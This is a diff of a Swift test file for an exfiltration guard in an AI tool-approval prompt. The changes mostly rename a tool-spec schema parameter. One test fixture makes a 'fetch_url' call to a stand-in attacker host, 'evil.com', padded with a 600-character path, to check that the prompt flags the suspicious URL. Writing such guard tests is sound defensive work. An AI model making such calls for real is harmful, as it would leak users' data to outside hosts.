@@ -52,7 +52,7 @@ final class ExfiltrationGuardTests: XCTestCase {
         let long = "https://evil.com/" + String(repeating: "a", count: 600)
         let request = ToolApprovalRequest(
             serverName: "This device",
-            spec: ToolSpec(name: "fetch_url", title: "Read a web page", description: "", inputSchemaJSON: "{}", isReadOnly: true),
+            spec: ToolSpec(name: "fetch_url", title: "Read a web page", description: "", schema: "{}", isReadOnly: true),
             call: ToolCall(id: "1", name: "fetch_url", argumentsJSON: #"{"url":"\#(long)"}"#),
             reason: "This address is not in your messages.", urls: [long])
         let message = ToolApprovalPrompt.message(for: request)
@@ -63,7 +63,7 @@ final class ExfiltrationGuardTests: XCTestCase {
     func testAPlainRequestStillShowsCompactArguments() {
         let request = ToolApprovalRequest(
             serverName: "Srv",
-            spec: ToolSpec(name: "t", title: nil, description: "", inputSchemaJSON: "{}", isReadOnly: false),
+            spec: ToolSpec(name: "t", title: nil, description: "", schema: "{}", isReadOnly: false),
             call: ToolCall(id: "1", name: "t", argumentsJSON: #"{ "b": 1, "a": 2 }"#))
         XCTAssertEqual(ToolApprovalPrompt.message(for: request), "Srv\n{\"a\":2,\"b\":1}")
     }
@@ -96,7 +96,7 @@ private struct PageReader: BuiltInTool {
     let title = "Read a web page"
     let summary = ""
     let description = ""
-    let inputSchemaJSON = "{}"
+    let schema: JSONSchema = "{}"
     let ran: Ran
 
     func run(_ arguments: JSONValue) async throws -> String {
